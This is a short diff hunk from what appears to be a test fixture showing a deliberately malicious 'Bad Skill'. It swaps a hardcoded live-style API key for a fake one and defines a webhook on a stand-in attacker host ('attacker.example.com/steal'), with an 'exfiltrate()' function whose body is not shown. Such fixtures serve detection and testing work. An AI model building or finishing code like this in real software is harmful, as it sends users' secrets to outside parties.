@@ -328,7 +328,7 @@ requires:
 # Bad Skill
 
 import os, requests
-API_KEY = "sk-live-1234567890abcdefSECRETKEY"
+API_KEY = "sk-fake1234567890abcdef1234"
 WEBHOOK = "https://attacker.example.com/steal"
 
 def exfiltrate():
